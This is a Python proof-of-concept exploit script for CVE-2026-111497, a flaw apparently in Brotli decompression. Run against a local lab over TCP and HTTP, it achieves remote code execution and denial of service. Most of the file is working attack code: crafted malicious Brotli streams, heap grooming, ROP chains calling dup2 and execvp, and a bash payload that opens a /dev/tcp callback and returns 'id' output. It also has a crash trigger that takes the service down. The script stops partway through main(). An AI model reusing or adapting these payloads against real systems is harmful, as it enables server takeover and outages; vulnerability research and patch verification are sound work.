#!/usr/bin/env python3
# Archived for authorized security research only.
# Source: https://github.com/dimasma0305/CVE-2026-111497-POC (MIT)
"""Network-only local-lab reproducer for CVE-2026-111497."""

from __future__ import annotations

import argparse
import hashlib
import http.client
import ipaddress
import json
import pathlib
import re
import secrets
import socket
import struct
import sys
import threading
import time
import urllib.parse

TRIGGER_SHA256 = "b7a6508eb39ef57ae5e3fdf9aa85540071a06eff5d5b5a2d359fc8e1768e4df4"
DEFAULT_PORT = 3000
ALLOWED_TARGET_HOSTS = frozenset({"127.0.0.1", "::1", "localhost"})
ID_OUTPUT = re.compile(
    r"uid=\d+(?:\([^)\r\n]+\))?\s+gid=\d+(?:\([^)\r\n]+\))?"
    r"(?:\s+groups=.*)?"
)
ROOT = pathlib.Path(__file__).resolve().parent
REGISTRY = ROOT / "profiles.json"


def load_profiles() -> dict[str, dict]:
    registry = json.loads(REGISTRY.read_text(encoding="utf-8"))
    profiles = {profile["id"]: profile for profile in registry["profiles"]}
    if len(profiles) != len(registry["profiles"]):
        raise RuntimeError("profiles.json contains duplicate profile IDs")
    allowed = {"RCE verified", "DoS verified"}
    unsupported = {
        profile_id: profile["status"]
        for profile_id, profile in profiles.items()
        if profile["status"] not in allowed
    }
    if unsupported:
        raise RuntimeError(f"unsupported profile statuses: {unsupported}")
    return profiles


class Bits:
    """Least-significant-bit-first writer for Brotli stream fields."""

    def __init__(self) -> None:
        self.data = bytearray()
        self.value = 0
        self.used = 0

    def put(self, value: int, count: int) -> None:
        for bit_index in range(count):
            self.value |= ((value >> bit_index) & 1) << self.used
            self.used += 1
            if self.used == 8:
                self.data.append(self.value)
                self.value = 0
                self.used = 0

    def aligned(self, value: bytes) -> None:
        if self.used:
            raise ValueError("writer is not byte-aligned")
        self.data.extend(value)

    def finish(self) -> bytes:
        if self.used:
            self.data.append(self.value)
            self.value = 0
            self.used = 0
        return bytes(self.data)


def one_symbol_tree(bits: Bits, alphabet_size: int, symbol: int) -> None:
    bits.put(1, 2)
    bits.put(0, 2)
    bits.put(symbol, (alphabet_size - 1).bit_length())


def varlen_u8(bits: Bits, value: int) -> None:
    if value == 0:
        bits.put(0, 1)
        return
    bits.put(1, 1)
    if value == 1:
        bits.put(0, 3)
        return
    width = value.bit_length() - 1
    bits.put(width, 3)
    bits.put(value - (1 << width), width)


def generate_stream() -> bytes:
    bits = Bits()

    bits.put(1, 1)
    bits.put(0, 3)
    bits.put(2, 3)

    bits.put(0, 1)
    bits.put(2, 2)
    bits.put(0xFFFFFF, 24)
    bits.put(0, 1)

    varlen_u8(bits, 0)
    varlen_u8(bits, 1)
    one_symbol_tree(bits, 4, 0)
    one_symbol_tree(bits, 26, 25)
    bits.put(0xFFFFFF, 24)
    varlen_u8(bits, 0)
    bits.put(3, 6)
    bits.put(0, 2)
    varlen_u8(bits, 0)
    varlen_u8(bits, 0)

    one_symbol_tree(bits, 256, 0)
    one_symbol_tree(bits, 704, 130)
    one_symbol_tree(bits, 704, 130)
    one_symbol_tree(bits, 400, 184)

    distance_extra = 4
    command_count = 1 << 24
    completed = 0
    while bits.used and completed < command_count:
        bits.put(distance_extra, 11)
        completed += 1

    group = Bits()
    for _ in range(8):
        group.put(distance_extra, 11)
    group_bytes = group.finish()
    groups, tail = divmod(command_count - completed, 8)
    bits.aligned(group_bytes * groups)
    for _ in range(tail):
        bits.put(distance_extra, 11)

    return bits.finish()


def generate_rce_stream(prefix: bytes, command_block_extra: int) -> bytes:
    if len(prefix) > 0x10000:
        raise ValueError("RCE prefix is too large")

    bits = Bits()
    bits.put(1, 1)
    bits.put(0, 3)
    bits.put(2, 3)

    if prefix:
        bits.put(0, 1)
        bits.put(0, 2)
        bits.put(len(prefix) - 1, 16)
        bits.put(1, 1)
        if bits.used:
            bits.put(0, 8 - bits.used)
        bits.aligned(prefix)

    bits.put(0, 1)
    bits.put(2, 2)
    bits.put(0xFFFFFF, 24)
    bits.put(0, 1)
    varlen_u8(bits, 0)
    varlen_u8(bits, 1)
    one_symbol_tree(bits, 4, 0)
    one_symbol_tree(bits, 26, 25)
    if not 0 <= command_block_extra <= 0xFFFFFF:
        raise ValueError("command block extra must fit in 24 bits")
    bits.put(command_block_extra, 24)
    varlen_u8(bits, 0)
    bits.put(3, 6)
    bits.put(0, 2)
    varlen_u8(bits, 0)
    varlen_u8(bits, 0)
    one_symbol_tree(bits, 256, 0)
    one_symbol_tree(bits, 704, 130)
    one_symbol_tree(bits, 704, 130)
    one_symbol_tree(bits, 400, 184)

    distance_extra = (len(prefix) + 32) // 8
    command_count = 1 << 24
    completed = 0
    while bits.used and completed < command_count:
        bits.put(distance_extra, 11)
        completed += 1

    group = Bits()
    for _ in range(8):
        group.put(distance_extra, 11)
    group_bytes = group.finish()
    groups, tail = divmod(command_count - completed, 8)
    bits.aligned(group_bytes * groups)
    for _ in range(tail):
        bits.put(distance_extra, 11)
    return bits.finish()


def resolve_loopback(host: str, port: int) -> list[tuple]:
    if host != host.strip():
        raise RuntimeError("target host contains surrounding whitespace")
    normalized_host = host.lower()
    if normalized_host not in ALLOWED_TARGET_HOSTS:
        allowed = ", ".join(sorted(ALLOWED_TARGET_HOSTS))
        raise RuntimeError(
            f"target host must be one of the fixed local-lab hosts: {allowed}"
        )

    targets = socket.getaddrinfo(
        normalized_host, port, type=socket.SOCK_STREAM
    )
    if not targets:
        raise RuntimeError(f"host did not resolve: {host}")
    non_loopback = [
        target[4][0]
        for target in targets
        if not ipaddress.ip_address(target[4][0]).is_loopback
    ]
    if non_loopback:
        raise RuntimeError(
            f"refusing non-loopback target {host}: {', '.join(non_loopback)}"
        )
    return targets


def connect_target(targets: list[tuple], timeout: float) -> socket.socket:
    last_error: OSError | None = None
    for family, socktype, protocol, _, address in targets:
        connection = socket.socket(family, socktype, protocol)
        connection.settimeout(min(timeout, 2.0))
        try:
            connection.connect(address)
            connection.settimeout(timeout)
            return connection
        except OSError as error:
            last_error = error
            connection.close()
    if last_error is None:
        raise RuntimeError("no resolved loopback target")
    raise last_error


def receive_line(connection: socket.socket, limit: int = 256) -> bytes:
    data = bytearray()
    while len(data) < limit:
        chunk = connection.recv(1)
        if not chunk:
            break
        data.extend(chunk)
        if chunk == b"\n":
            break
    return bytes(data)


def framed_healthcheck(targets: list[tuple], timeout: float) -> bool:
    try:
        with connect_target(targets, timeout) as connection:
            connection.sendall(framed(b""))
            return receive_line(connection) == b"PONG\n"
    except OSError:
        return False


def framed(data: bytes) -> bytes:
    return struct.pack(">I", len(data)) + data


def trigger_stages() -> tuple[bytes, bytes]:
    trigger = generate_stream()
    digest = hashlib.sha256(trigger).hexdigest()
    if digest != TRIGGER_SHA256:
        raise RuntimeError(f"trigger hash mismatch: {digest}")

    first = trigger + b"\x00" * 3
    second = bytearray(127)
    second[7] = 8
    struct.pack_into("<i", second, 15, 0x7FFFFFFF)
    struct.pack_into("<I", second, 19, 0x7FFFFFFF)
    struct.pack_into("<I", second, 23, 0x7FFFFFFF)
    return first, bytes(second)


def profile_int(profile: dict, name: str) -> int:
    value = profile["probe"][name]
    return int(value, 0) if isinstance(value, str) else int(value)


def rce_stage_two(pos: int, size: int) -> bytes:
    if size < 27:
        raise ValueError("RCE stage two must be at least 27 bytes")
    body = bytearray(size)
    body[7] = 8
    struct.pack_into("<i", body, 15, pos)
    struct.pack_into("<I", body, 19, 0x7FFFFFFF)
    struct.pack_into("<I", body, 23, 0x7FFFFFFF)
    return bytes(body)


def rce_stage_one(
    target: int,
    command_block_extra: int,
    proof_payload: bytes | None = None,
) -> bytes:
    prefix = bytearray(1024)
    if proof_payload:
        if len(proof_payload) > 512:
            raise ValueError("RCE proof payload exceeds 512 bytes")
        prefix[: len(proof_payload)] = proof_payload

    pair = struct.pack("<QQ", target, target)
    start = 71 if not proof_payload else len(proof_payload) + (
        (7 - len(proof_payload)) % 16
    )
    for offset in range(start, len(prefix) - 15, 16):
        prefix[offset : offset + 16] = pair
    return generate_rce_stream(bytes(prefix), command_block_extra) + b"\x00" * 3


def build_rce_payload(
    profile: dict,
    callback_host: str,
    callback_port: int,
    token: str,
) -> bytes:
    if not re.fullmatch(r"[A-Za-z0-9.-]+", callback_host):
        raise RuntimeError("callback host contains unsupported characters")
    allowed_hosts = profile["probe"]["callback_hosts"]
    if callback_host not in allowed_hosts:
        raise RuntimeError(
            f"callback host must be one of the profile allowlist: {allowed_hosts}"
        )

    base = profile_int(profile, "bss_payload")
    gadget = profile_int(profile, "callback_gadget")
    execvp_plt = profile_int(profile, "execvp_plt")
    command = (
        f"exec 3<>/dev/tcp/{callback_host}/{callback_port};"
        f"printf '{token}\\n'>&3;id >&3"
    )

    data = bytearray(512)
    data[:8] = b"RCEPROOF"
    context_offset_value = profile["probe"].get("context_offset", 0x40)
    context_offset = (
        int(context_offset_value, 0)
        if isinstance(context_offset_value, str)
        else int(context_offset_value)
    )
    context = base + context_offset
    filename = base + 0x100
    argv = base + 0x110
    option_c = base + 0x140
    command_address = base + 0x150
    struct.pack_into("<Q", data, 0x08, gadget)
    struct.pack_into("<Q", data, 0x20, context)
    struct.pack_into("<Q", data, context_offset + 0x98, filename)
    struct.pack_into("<Q", data, context_offset + 0xA0, argv)
    struct.pack_into("<Q", data, context_offset + 0xA8, execvp_plt)
    data[0x100 : 0x10A] = b"/bin/bash\0"
    struct.pack_into("<QQQQ", data, 0x110, filename, option_c, command_address, 0)
    data[0x140 : 0x143] = b"-c\0"
    encoded_command = command.encode("ascii") + b"\0"
    if 0x150 + len(encoded_command) > len(data):
        raise RuntimeError("fixed id proof command does not fit the RCE payload")
    data[0x150 : 0x150 + len(encoded_command)] = encoded_command
    return bytes(data)


def receive_at_least(
    connection: socket.socket,
    minimum: int,
    limit: int,
) -> bytes:
    data = bytearray()
    while len(data) < minimum and len(data) < limit:
        part = connection.recv(min(65536, limit - len(data)))
        if not part:
            break
        data.extend(part)
    return bytes(data)


def receive_to_close(connection: socket.socket, limit: int = 1024) -> bytes:
    data = bytearray()
    while len(data) < limit:
        part = connection.recv(min(512, limit - len(data)))
        if not part:
            break
        data.extend(part)
    return bytes(data)


def verify_id_proof(token: str, proof: bytes, peer: str) -> str:
    text = proof.decode("ascii", errors="replace")
    prefix = f"{token}\n"
    if not text.startswith(prefix):
        raise RuntimeError(f"callback token mismatch from {peer}: {text!r}")
    identity = text[len(prefix) :].strip()
    if ID_OUTPUT.fullmatch(identity) is None:
        raise RuntimeError(
            f"callback did not contain complete id output from {peer}: "
            f"{identity!r}"
        )
    return identity


def rce_attack(
    profile: dict,
    targets: list[tuple],
    timeout: float,
    callback_bind: str,
    callback_host: str,
    callback_port: int,
) -> tuple[str, str, str]:
    if callback_bind not in {"127.0.0.1", "0.0.0.0"}:
        raise RuntimeError("callback bind must be 127.0.0.1 or 0.0.0.0")
    if not 1 <= callback_port <= 65535:
        raise RuntimeError("callback port must be between 1 and 65535")

    token = f"CVE111497_{secrets.token_hex(16)}"
    proof_payload = build_rce_payload(
        profile, callback_host, callback_port, token
    )
    groom_first = rce_stage_one(
        profile_int(profile, "groom_word"),
        profile_int(profile, "groom_command_block_extra"),
    )
    poison_first = rce_stage_one(
        profile_int(profile, "bss_payload"),
        profile_int(profile, "poison_command_block_extra"),
        proof_payload,
    )

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((callback_bind, callback_port))
        listener.listen(1)
        listener.settimeout(timeout)

        with connect_target(targets, timeout) as groom:
            groom.sendall(framed(groom_first))
            acknowledgement = receive_line(groom)
            if acknowledgement != b"ACK\n":
                raise RuntimeError(
                    f"groom stage was not accepted: {acknowledgement!r}"
                )
            groom.sendall(
                framed(
                    rce_stage_two(
                        profile_int(profile, "groom_staged_pos"), 127
                    )
                )
            )
            groom_output = receive_at_least(groom, 16384, 65536)
            if len(groom_output) < 16384:
                raise RuntimeError(
                    "groom connection ended before the required output"
                )

            with connect_target(targets, timeout) as exploit:
                exploit.sendall(framed(poison_first))
                acknowledgement = receive_line(exploit)
                if acknowledgement != b"ACK\n":
                    raise RuntimeError(
                        f"poison stage was not accepted: {acknowledgement!r}"
                    )
                exploit.sendall(
                    framed(
                        rce_stage_two(
                            profile_int(profile, "poison_staged_pos"), 27
                        )
                    )
                )

                callback, peer = listener.accept()
                with callback:
                    callback.settimeout(min(timeout, 5.0))
                    proof = receive_to_close(callback)
                identity = verify_id_proof(token, proof, peer[0])
                return peer[0], token, identity


def framed_attack(targets: list[tuple], timeout: float) -> bytes:
    first, second = trigger_stages()

    with connect_target(targets, timeout) as connection:
        connection.sendall(framed(first))
        acknowledgement = receive_line(connection)
        if acknowledgement.startswith(b"ERR "):
            return acknowledgement
        if acknowledgement != b"ACK\n":
            raise RuntimeError(
                f"first stage was not accepted: {acknowledgement!r}"
            )
        connection.sendall(framed(second))
        try:
            return receive_line(connection)
        except OSError:
            return b""


def receive_http(connection: socket.socket, limit: int = 4096) -> bytes:
    data = bytearray()
    try:
        while len(data) < limit:
            chunk = connection.recv(min(4096, limit - len(data)))
            if not chunk:
                break
            data.extend(chunk)
    except OSError:
        pass
    return bytes(data)


def http_healthcheck(targets: list[tuple], timeout: float) -> bool:
    try:
        with connect_target(targets, timeout) as connection:
            connection.sendall(
                b"GET /health HTTP/1.1\r\n"
                b"Host: lab\r\n"
                b"Connection: close\r\n\r\n"
            )
            response = receive_http(connection)
            return response.startswith(b"HTTP/1.1 200") and b"PONG\n" in response
    except OSError:
        return False


def chunk(data: bytes) -> bytes:
    return f"{len(data):x}\r\n".encode("ascii") + data + b"\r\n"


def http_body_attack(
    profile: dict,
    targets: list[tuple],
    timeout: float,
) -> bytes:
    first, second = trigger_stages()
    content_type = profile["probe"].get(
        "content_type", "application/octet-stream"
    )
    headers = (
        b"POST /upload HTTP/1.1\r\n"
        b"Host: lab\r\n"
        + f"Content-Type: {content_type}\r\n".encode("ascii")
        + b"Content-Encoding: br\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"Connection: close\r\n\r\n"
    )
    with connect_target(targets, timeout) as connection:
        connection.sendall(headers)
        connection.sendall(chunk(first))
        time.sleep(0.5)
        try:
            connection.sendall(chunk(second) + b"0\r\n\r\n")
        except OSError:
            return b""
        return receive_http(connection)


def express_socket_rce_stages(profile: dict, position: int) -> tuple[bytes, bytes]:
    """Build the exact-profile Express request that returns ``id`` on its socket."""
    prefix_size = profile_int(profile, "prefix_size")
    source = profile_int(profile, "copy_source_offset")
    prefix = bytearray(prefix_size)

    pivot = (
        profile_int(profile, "mov_rax_rdi_ret"),
        profile_int(profile, "pivot_rsp_rax_30_ret"),
    )
    struct.pack_into("<QQ", prefix, source, *pivot)

    bss = profile_int(profile, "bss_base")
    socket_fd = profile_int(profile, "accepted_socket_fd")
    chain = (
        profile_int(profile, "pop_rsi_ret"),
        bss + 8,
        profile_int(profile, "store_rdi_plus_88_ret"),
        profile_int(profile, "pop_rbx_ret"),
        bss,
        profile_int(profile, "pop_rdi_ret"),
        socket_fd,
        profile_int(profile, "pop_rsi_ret"),
        1,
        profile_int(profile, "dup2_plt"),
        profile_int(profile, "execvp_call_site"),
    )
    struct.pack_into("<" + "Q" * len(chain), prefix, source + 0x30, *chain)
    path = b"/usr/bin/id\0"
    path_offset = source + 0x88
    if path_offset + len(path) > len(prefix):
        raise RuntimeError("Express id path falls outside the controlled prefix")
    prefix[path_offset : path_offset + len(path)] = path

    first = (
        generate_rce_stream(
            bytes(prefix), profile_int(profile, "command_block_extra")
        )
        + b"\x00" * 3
    )
    second = rce_stage_two(position, profile_int(profile, "second_stage_size"))
    return first, second


def wait_http_healthcheck(
    targets: list[tuple], timeout: float, deadline_seconds: float
) -> bool:
    deadline = time.monotonic() + deadline_seconds
    while time.monotonic() < deadline:
        if http_healthcheck(targets, min(timeout, 1.0)):
            return True
        time.sleep(0.1)
    return False


def wait_http_unhealthy(
    targets: list[tuple], timeout: float, deadline_seconds: float
) -> bool:
    deadline = time.monotonic() + deadline_seconds
    while time.monotonic() < deadline:
        if not http_healthcheck(targets, min(timeout, 0.5)):
            return True
        time.sleep(0.05)
    return False


def http_express_socket_rce_attack(
    profile: dict,
    targets: list[tuple],
    timeout: float,
    attempts_override: int | None,
) -> tuple[int, str]:
    """Try fresh supervised workers and require ``id`` stdout on the request socket."""
    probe = profile["probe"]
    raw_positions = probe["staged_positions"]
    positions = [
        int(value, 0) if isinstance(value, str) else int(value)
        for value in raw_positions
    ]
    if not positions:
        raise RuntimeError("Express RCE profile has no staged positions")
    attempts = attempts_override or int(probe["attempts"])
    stage_delay = float(probe["stage_delay_seconds"])
    restart_timeout = float(probe["restart_timeout_seconds"])
    content_type = probe.get("content_type", "application/json")
    headers = (
        b"POST /upload HTTP/1.1\r\n"
        b"Host: lab\r\n"
        + f"Content-Type: {content_type}\r\n".encode("ascii")
        + b"Content-Encoding: br\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"Connection: close\r\n\r\n"
    )
    stages = {
        position: express_socket_rce_stages(profile, position)
        for position in set(positions)
    }

    last_response = b""
    for attempt in range(1, attempts + 1):
        if not wait_http_healthcheck(targets, timeout, restart_timeout):
            raise RuntimeError("Express lab did not become healthy for a fresh attempt")
        position = positions[(attempt - 1) % len(positions)]
        first, second = stages[position]
        print(f"attempt={attempt}/{attempts} staged_position={position:#x}")
        try:
            with connect_target(targets, timeout) as connection:
                connection.sendall(headers + chunk(first))
                time.sleep(stage_delay)
                connection.sendall(chunk(second) + b"0\r\n\r\n")
                last_response = receive_http(connection, limit=16384)
        except OSError:
            last_response = b""

        text = last_response.decode("utf-8", errors="replace").strip()
        identity = next(
            (
                line.strip()
                for line in text.splitlines()
                if ID_OUTPUT.fullmatch(line.strip()) is not None
            ),
            None,
        )
        if identity is not None:
            return attempt, identity

        if attempt < attempts:
            print("fresh_process_reset=network crash trigger")
            try:
                http_body_attack(profile, targets, timeout)
            except OSError:
                # A successful crash can abort the trigger connection.
                pass
            if not wait_http_unhealthy(targets, timeout, 3.0):
                raise RuntimeError(
                    "network crash trigger did not stop the current Express worker"
                )

    sample = last_response[:512].decode("latin-1", errors="replace")
    raise RuntimeError(
        f"fresh id output was not observed after {attempts} attempts; "
        f"last_response={sample!r}"
    )


def serve_brotli_origin(
    listener: socket.socket,
    first: bytes,
    second: bytes,
    timeout: float,
    state: dict[str, object],
) -> None:
    try:
        listener.settimeout(timeout)
        connection, _ = listener.accept()
        state["connected"] = True
        with connection:
            connection.settimeout(timeout)
            request = bytearray()
            while b"\r\n\r\n" not in request and len(request) < 8192:
                data = connection.recv(1024)
                if not data:
                    break
                request.extend(data)
            if not request.startswith(b"GET "):
                raise RuntimeError("origin received a non-GET request")
            connection.sendall(
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: application/octet-stream\r\n"
                b"Content-Encoding: br\r\n"
                b"Transfer-Encoding: chunked\r\n"
                b"Connection: close\r\n\r\n"
            )
            connection.sendall(chunk(first))
            state["first_sent"] = True
            time.sleep(0.5)
            state["second_attempted"] = True
            connection.sendall(chunk(second) + b"0\r\n\r\n")
    except OSError as error:
        state["error"] = error


def open_fetch_request(
    targets: list[tuple],
    timeout: float,
    origin_host: str,
    origin_port: int,
) -> socket.socket:
    origin_url = f"http://{origin_host}:{origin_port}/payload"
    path = "/fetch?url=" + urllib.parse.quote(origin_url, safe="")
    connection = connect_target(targets, timeout)
    connection.sendall(
        f"GET {path} HTTP/1.1\r\n"
        "Host: lab\r\n"
        "Connection: close\r\n\r\n".encode("ascii")
    )
    return connection


def serve_rce_brotli_origin(
    listener: socket.socket,
    first: bytes,
    second: bytes,
    timeout: float,
    ready: threading.Event,
    hold: threading.Event,
    state: dict[str, object],
) -> None:
    try:
        listener.settimeout(timeout)
        connection, _ = listener.accept()
        state["connected"] = True
        with connection:
            connection.settimeout(timeout)
            request = bytearray()
            while b"\r\n\r\n" not in request and len(request) < 8192:
                data = connection.recv(1024)
                if not data:
                    break
                request.extend(data)
            if not request.startswith(b"GET "):
                raise RuntimeError("origin received a non-GET request")
            connection.sendall(
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: application/octet-stream\r\n"
                b"Content-Encoding: br\r\n"
                b"Transfer-Encoding: chunked\r\n"
                b"Connection: close\r\n\r\n"
            )
            connection.sendall(chunk(first))
            time.sleep(1.0)
            connection.sendall(chunk(second))
            state["stages_sent"] = True
            ready.set()
            hold.wait(timeout)
    except Exception as error:
        state["error"] = error
        ready.set()


def http_fetch_rce_attack(
    profile: dict,
    targets: list[tuple],
    timeout: float,
    callback_bind: str,
    callback_host: str,
    callback_port: int,
) -> tuple[str, str, str]:
    if callback_bind not in {"127.0.0.1", "0.0.0.0"}:
        raise RuntimeError("callback bind must be 127.0.0.1 or 0.0.0.0")
    if not 1 <= callback_port <= 65535:
        raise RuntimeError("callback port must be between 1 and 65535")

    probe = profile["probe"]
    origin_bind = probe.get("origin_bind", "127.0.0.1")
    if origin_bind not in {"127.0.0.1", "0.0.0.0"}:
        raise RuntimeError("origin bind must be 127.0.0.1 or 0.0.0.0")
    origin_host = probe["origin_host"]
    origin_port = int(probe["origin_port"])
    if not 1 <= origin_port <= 65535:
        raise RuntimeError("origin port must be between 1 and 65535")

    token = f"CVE111497_{secrets.token_hex(16)}"
    proof_payload = bytearray(
        build_rce_payload(profile, callback_host, callback_port, token)
    )
    copy_source_offset = profile_int(profile, "copy_source_offset")
    if copy_source_offset < 0 or copy_source_offset + 16 > len(proof_payload):
        raise RuntimeError("copy source is outside the RCE proof payload")
    bss_payload = profile_int(profile, "bss_payload")
    struct.pack_into(
        "<QQ",
        proof_payload,
        copy_source_offset,
        bss_payload,
        bss_payload,
    )

    groom_first = rce_stage_one(
        profile_int(profile, "groom_word"),
        profile_int(profile, "groom_command_block_extra"),
    )
    poison_first = rce_stage_one(
        bss_payload,
        profile_int(profile, "poison_command_block_extra"),
        proof_payload,
    )
    groom_second = rce_stage_two(
        profile_int(profile, "groom_staged_pos"), 127
    )
    poison_second = rce_stage_two(
        profile_int(profile, "poison_staged_pos"), 27
    )

    hold = threading.Event()
    groom_ready = threading.Event()
    exploit_ready = threading.Event()
    groom_state: dict[str, object] = {}
    exploit_state: dict[str, object] = {}
    groom_request: socket.socket | None = None
    exploit_request: socket.socket | None = None

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as origin_listener:
        origin_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        origin_listener.bind((origin_bind, origin_port))
        origin_listener.listen(2)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as callback_listener:
            callback_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            callback_listener.bind((callback_bind, callback_port))
            callback_listener.listen(1)
            callback_listener.settimeout(timeout)

            groom_thread = threading.Thread(
                target=serve_rce_brotli_origin,
                args=(
                    origin_listener,
                    groom_first,
                    groom_second,
                    timeout,
                    groom_ready,
                    hold,
                    groom_state,
                ),
                daemon=True,
            )
            exploit_thread: threading.Thread | None = None
            try:
                groom_thread.start()
                groom_request = open_fetch_request(
                    targets, timeout, origin_host, origin_port
                )
                if not groom_ready.wait(min(timeout, 10.0)):
                    raise RuntimeError("groom response did not send both stages")
                if groom_state.get("error"):
                    raise RuntimeError(f"groom origin failed: {groom_state['error']}")

                groom_response = http.client.HTTPResponse(groom_request)
                groom_response.begin()
                groom_output = groom_response.read(16000)
                if len(groom_output) < 16000:
                    raise RuntimeError(
                        "groom response ended before 16000 decoded bytes"
                    )

                exploit_thread = threading.Thread(
                    target=serve_rce_brotli_origin,
                    args=(
                        origin_listener,
                        poison_first,
                        poison_second,
                        timeout,
                        exploit_ready,
                        hold,
                        exploit_state,
                    ),
                    daemon=True,
                )
                exploit_thread.start()
                exploit_request = open_fetch_request(
                    targets, timeout, origin_host, origin_port
                )
                if not exploit_ready.wait(min(timeout, 10.0)):
                    raise RuntimeError("exploit response did not send both stages")
                if exploit_state.get("error"):
                    raise RuntimeError(
                        f"exploit origin failed: {exploit_state['error']}"
                    )

                callback, peer = callback_listener.accept()
                with callback:
                    callback.settimeout(min(timeout, 5.0))
                    proof = receive_to_close(callback)
                identity = verify_id_proof(token, proof, peer[0])
                return peer[0], token, identity
            finally:
                hold.set()
                if groom_request is not None:
                    groom_request.close()
                if exploit_request is not None:
                    exploit_request.close()
                groom_thread.join(min(timeout, 5.0))
                if exploit_thread is not None:
                    exploit_thread.join(min(timeout, 5.0))


def http_fetch_attack(
    profile: dict,
    targets: list[tuple],
    timeout: float,
) -> bytes:
    first, second = trigger_stages()
    origin_port = profile["probe"]["origin_port"]
    origin_host = profile["probe"]["origin_host"]
    origin_url = f"http://{origin_host}:{origin_port}/payload"
    path = "/fetch?url=" + urllib.parse.quote(origin_url, safe="")
    state: dict[str, object] = {}

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("127.0.0.1", origin_port))
        listener.listen(1)
        thread = threading.Thread(
            target=serve_brotli_origin,
            args=(listener, first, second, timeout, state),
            daemon=True,
        )
        thread.start()
        with connect_target(targets, timeout) as connection:
            connection.sendall(
                f"GET {path} HTTP/1.1\r\n"
                "Host: lab\r\n"
                "Connection: close\r\n\r\n".encode("ascii")
            )
            response = receive_http(connection)
        thread.join(timeout)

    if thread.is_alive():
        raise RuntimeError("attacker origin did not finish")
    if not state.get("connected"):
        raise RuntimeError(f"target did not fetch from attacker origin: {state}")
    if not state.get("first_sent") or not state.get("second_attempted"):
        raise RuntimeError(f"attacker origin did not send both stages: {state}")
    return response


def healthcheck(profile: dict, targets: list[tuple], timeout: float) -> bool:
    transport = profile["probe"].get("transport", "framed-tcp")
    if transport in {"framed-tcp", "framed-rce"}:
        return framed_healthcheck(targets, timeout)
    if transport in {
        "http-br-body",
        "http-fetch",
        "http-fetch-rce",
        "http-express-socket-rce",
    }:
        return http_healthcheck(targets, timeout)
    raise RuntimeError(f"unsupported transport: {transport}")


def attack(profile: dict, targets: list[tuple], timeout: float) -> bytes:
    transport = profile["probe"].get("transport", "framed-tcp")
    if transport == "framed-tcp":
        return framed_attack(targets, timeout)
    if transport == "http-br-body":
        return http_body_attack(profile, targets, timeout)
    if transport == "http-fetch":
        return http_fetch_attack(profile, targets, timeout)
    raise RuntimeError(f"unsupported transport: {transport}")


def verify(
    profile_id: str,
    profile: dict,
    host: str,
    port: int,
    timeout: float,
    callback_bind: str,
    callback_host: str | None,
    callback_port: int | None,
    attempts: int | None,
) -> int:
    status = profile["status"]
    transport = profile["probe"].get("transport", "framed-tcp")
    declared_port = int(profile["probe"].get("port", DEFAULT_PORT))
    if port != declared_port:
        raise RuntimeError(
            f"target port must match the selected profile: {declared_port}"
        )

    selected_callback_host: str | None = None
    selected_callback_port: int | None = None
    if (
        transport in {"framed-rce", "http-fetch-rce"}
        and status == "RCE verified"
    ):
        if callback_bind not in {"127.0.0.1", "0.0.0.0"}:
            raise RuntimeError(
                "callback bind must be 127.0.0.1 or 0.0.0.0"
            )
        selected_callback_host = (
            callback_host or profile["probe"]["callback_hosts"][0]
        )
        if not re.fullmatch(r"[A-Za-z0-9.-]+", selected_callback_host):
            raise RuntimeError("callback host contains unsupported characters")
        allowed_callback_hosts = profile["probe"]["callback_hosts"]
        if selected_callback_host not in allowed_callback_hosts:
            raise RuntimeError(
                "callback host must be one of the profile allowlist: "
                f"{allowed_callback_hosts}"
            )
        declared_callback_port = int(profile["probe"]["callback_port"])
        if (
            callback_port is not None
            and callback_port != declared_callback_port
        ):
            raise RuntimeError(
                "callback port must match the selected profile: "
                f"{declared_callback_port}"
            )
        selected_callback_port = declared_callback_port

    targets = resolve_loopback(host, port)
    if not healthcheck(profile, targets, timeout):
        raise RuntimeError("target service was not healthy before the attempt")

    if transport == "http-express-socket-rce":
        if status != "RCE verified":
            raise RuntimeError(f"invalid status for Express socket RCE: {status}")
        attempt, identity = http_express_socket_rce_attack(
            profile, targets, timeout, attempts
        )
        print("PASS: RCE verified by fresh id output through the declared interface")
        print(f"profile={profile_id}")
        print("proof_channel=HTTP request socket stdout")
        print("proof_command=id")
        print(f"proof_stdout={identity}")
        print(f"successful_attempt={attempt}")
        return 0

    if transport in {"framed-rce", "http-fetch-rce"}:
        if status != "RCE verified":
            raise RuntimeError(f"invalid status for framed-rce: {status}")
        if selected_callback_host is None or selected_callback_port is None:
            raise RuntimeError("RCE callback policy was not initialized")
        if transport == "framed-rce":
            peer, token, identity = rce_attack(
                profile,
                targets,
                timeout,
                callback_bind,
                selected_callback_host,
                selected_callback_port,
            )
        else:
            peer, token, identity = http_fetch_rce_attack(
                profile,
                targets,
                timeout,
                callback_bind,
                selected_callback_host,
                selected_callback_port,
            )
        print("PASS: RCE verified by fresh id output through the declared interface")
        print(f"profile={profile_id}")
        print(f"callback_peer={peer}")
        print(f"proof_token={token}")
        print("proof_command=id")
        print(f"proof_stdout={identity}")
        return 0

    response = attack(profile, targets, timeout)

    for _ in range(4):
        if healthcheck(profile, targets, min(timeout, 1.0)):
            raise RuntimeError(
                f"target remained healthy after trigger; response={response!r}"
            )
        time.sleep(0.25)

    print("PASS: DoS verified through the declared network interface")
    print(f"profile={profile_id}")
    print(f"trigger_sha256={TRIGGER_SHA256}")
    print("postcondition=service unavailable")
    return 0


def main() -> int:
    profiles = load_profiles()
    parser = argparse.ArgumentParser(
        description=(
            "Send the CVE-2026-111497 trigger to an already-running loopback lab"
        )
    )
    parser.add_argument("--profile", choices=tuple(profiles), required=True)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument(
        "--port",
        type=int,
        help="target port; must match the selected profile's local-lab port",
    )
